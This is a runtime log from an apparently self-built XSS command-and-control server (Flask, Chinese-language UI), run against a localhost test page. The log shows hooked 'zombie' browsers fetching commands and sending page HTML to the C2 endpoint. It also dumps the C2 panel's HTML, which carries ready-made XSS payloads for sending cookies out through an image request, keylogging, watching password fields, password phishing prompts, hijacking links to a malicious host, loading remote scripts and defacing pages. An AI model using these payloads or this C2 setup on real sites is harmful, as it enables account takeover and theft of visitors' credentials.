2025-06-26 22:38:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:50] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:38:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:38:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:38:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:38:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:38:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:38:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:38:55 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:38:55 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:38:55.641Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:38:55 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:38:55.646699', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:38:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0056s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:38:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0045s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:38:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:55] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:38:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:55] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:39:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:39:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:39:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:39:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:39:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:39:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:39:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:39:00 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:39:00 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:39:00.645042', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:39:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0008s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:39:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:39:00] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:39:00 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:39:00.640Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:39:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0075s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:39:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:39:00] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:39:05 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 22:39:05 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 22:39:05 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 22:39:05 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 22:39:05 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 22:39:05 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 22:39:05 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 22:39:05 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 22:39:05 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 22:39:35 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 22:39:35 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 22:39:35 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 29475)
2025-06-26 22:39:35 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 22:39:35 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 22:39:35 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 22:39:35 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-26 22:39:35 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-26 22:40:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:40:51 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:40:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0342s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 